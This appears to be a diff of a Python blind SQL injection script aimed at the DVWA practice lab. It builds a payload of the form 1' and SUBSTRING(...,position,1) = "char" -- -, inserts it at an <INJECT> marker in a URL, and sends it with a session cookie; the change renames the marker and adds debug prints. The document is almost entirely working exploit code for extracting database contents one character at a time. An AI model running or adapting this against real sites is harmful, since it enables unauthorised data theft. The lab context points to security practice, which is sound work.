@@ -12,9 +12,14 @@ def check(webpage, idenifier):
 def request(url, selector, coockie, position, character):
     # coockie para sesion en DWVA
     cookies = dict(PHPSESSID=coockie, security='low')
-    temp = url[0:url.index("<Inject>")] + "1\' and SUBSTRING(" + selector + "," + str(position) + ",1) = \"" + character + "\" -- -"
-    temp2 = url[url.index("<Inject>") + 8:]
+    temp = url[0:url.index("<INJECT>")] + "1\' and SUBSTRING(" + selector + "," + str(position) + ",1) = \"" + character + "\" -- -"
+    temp2 = url[url.index("<INJECT>") + 8:]
     final = temp + temp2
+
+    print(url)
+    print(temp)
+    print(temp2)
+    print(final)
 
     return (requests.get(final, cookies=cookies)).text
 
